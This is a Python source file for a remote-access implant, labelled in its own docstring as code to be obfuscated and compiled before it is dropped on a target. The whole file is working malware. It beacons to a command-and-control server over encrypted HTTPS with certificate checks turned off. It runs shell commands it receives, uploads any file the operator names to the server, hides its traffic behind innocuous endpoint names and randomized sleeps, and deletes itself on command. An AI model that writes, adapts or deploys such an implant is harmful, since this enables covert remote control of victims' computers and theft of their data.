"""
Implant source code, don't drop this in target - obfuscate and compile first
"""

import os
import base64
import subprocess
import time
import random
import json
import io

import requests
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization
# import urllib3

# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HOST = ""  # put c2 ip here
C2_URL = "https://" + HOST + ":" + "8443"
BEACON_URL = C2_URL + "/api/telemetry"
RESULT_URL = C2_URL + "/api/updates"
FILE_URL = C2_URL + "/api/upload"

normal_sleep_range = (10, 11)
long_sleep_range = (600, 1200)
long_sleep = False
attempts = 0

derived_key = None


# def encrypt_data(aes_key: bytes, plaintext: bytes | str) -> bytes:
def encrypt_data(aes_key: bytes, plaintext: bytes) -> bytes:
    """Encrypt data using AES-256-GCM with nonce and encode with base64"""
    if isinstance(plaintext, str):
        plaintext = plaintext.encode()

    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return base64.b64encode(nonce + ciphertext)


def decrypt_data(aes_key: bytes, b64_data: bytes, decode: bool = True):
    """Decrypt data using AES-256-GCM with nonce and decode with base64"""
    data = base64.b64decode(b64_data)
    nonce = data[:12]
    ciphertext_and_tag = data[12:]

    aesgcm = AESGCM(aes_key)
    plaintext = aesgcm.decrypt(nonce, ciphertext_and_tag, None)
    return plaintext if not decode else plaintext.decode("utf-8")


def exchange_keys(derived_key: bytes, attempts: int, long_sleep: bool):
    """
    X25519 key exchange protocol:

    1. On start, client generates key pair and sends public key in first beacon to server
    2. Server generates key pair and responds to client with its public key
    3. Both client and server derive shared secret AES key and use it for following communications
    - These packets are encrypted with pre-shared key
    - If client can't connect to server, it will keep retrying with new key pairs
    """
    # generate X25519 keypair
    client_private_key = x25519.X25519PrivateKey.generate()
    client_public_key = client_private_key.public_key()
    client_public_bytes = client_public_key.public_bytes(
        encoding=serialization.Encoding.Raw, format=serialization.PublicFormat.Raw
    )

    # send initial beacon with client public key
    pre_shared_key = b"]T\xb8\x9e\xc4*}F\x01\xa7\xa30P-Y\xb1\x87W\x07\xe9\xe3\x81\x95r\x11v\n\xf498=\x9f"
    enc_public_bytes = encrypt_data(pre_shared_key, client_public_bytes)
    r = requests.post(BEACON_URL, data=enc_public_bytes, verify=False, timeout=5)
    # contingency: enter long sleep mode if can't reach C2 until we can
    if not r.ok:
        attempts += 1
        # return early to retry connection attempt
        return derived_key, attempts, long_sleep

    # request successful, receive public key from server
    long_sleep = False
    attempts = 0
    enc = r.content
    server_public_bytes = decrypt_data(pre_shared_key, enc, False)

    # compute shared secret
    server_public_key = x25519.X25519PublicKey.from_public_bytes(server_public_bytes)
    shared_secret = client_private_key.exchange(server_public_key)

    # derive AES key using HKDF
    derived_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b"handshake data",
    ).derive(shared_secret)

    return derived_key, attempts, long_sleep


def sleep():
    if long_sleep:
        time.sleep(random.randrange(*long_sleep_range))
    else:
        time.sleep(random.randrange(*normal_sleep_range))


while True:
    if attempts >= 3:
        long_sleep = True

    try:
        # exchange encryption keys before sending data
        if not derived_key:
            derived_key, attempts, long_sleep = exchange_keys(
                derived_key, attempts, long_sleep
            )
            continue

        r = requests.post(BEACON_URL, verify=False, timeout=5)
        # contingency: enter long sleep mode if can't reach C2 until we can
        if not r.ok:
            attempts += 1
            sleep()
            continue
        # request successful
        long_sleep = False
        attempts = 0

        data = json.loads(decrypt_data(derived_key, r.content))
        tasks: list[str] = data["tasks"]
        for task in tasks:
            # destroy
            if task == "DESTROY":
                import sys

                try:
                    # delete itself and exit
                    script_path = os.path.realpath(__file__)
                    print("removing:", script_path)
                    os.remove(script_path)
                    time.sleep(1)
                    sys.exit(0)
                except Exception as e:
                    print(f"Error self-destructing: {e}")
                    sys.exit(1)
            # find and upload file
            elif task[:4] == "FILE":
                file_path = task.removeprefix("FILE ")
                status = None
                try:
                    with open(file_path, "rb") as f:
                        file_bytes = f.read()
                        enc_filename = encrypt_data(derived_key, file_path)
                        enc_data = encrypt_data(derived_key, file_bytes)
                        enc_file = io.BytesIO(enc_data)
                        file = {"file": (enc_filename, enc_file)}
                        response = requests.post(
                            FILE_URL, files=file, timeout=5, verify=False
                        )

                    status = encrypt_data(
                        derived_key,
                        json.dumps({"status": ""}),
                    )
                except FileNotFoundError:
                    status = encrypt_data(
                        derived_key,
                        json.dumps({"status": f"Error: file '{file_path}' not found"}),
                    )
                except PermissionError:
                    status = encrypt_data(
                        derived_key,
                        json.dumps(
                            {"status": f"Error: no read permissions for '{file_path}'"}
                        ),
                    )
                except requests.RequestException as e:
                    status = encrypt_data(
                        derived_key, json.dumps({"status": f"Request error: {e}"})
                    )
                except Exception as e:
                    status = encrypt_data(
                        derived_key, json.dumps({"status": f"Unknown error: {e}"})
                    )

                # post file upload status
                requests.post(RESULT_URL, data=status, timeout=5, verify=False)
            # run shell cmd and upload results
            else:
                try:
                    output = subprocess.check_output(
                        task, shell=True, stderr=subprocess.STDOUT, text=True
                    )
                except subprocess.CalledProcessError as e:
                    output = e.output

                result_payload = encrypt_data(
                    derived_key, json.dumps({"result": output})
                )
                requests.post(RESULT_URL, data=result_payload, timeout=5, verify=False)

        sleep()
    except requests.RequestException as e:
        print(f"[!] Error: {e}")
        sleep()
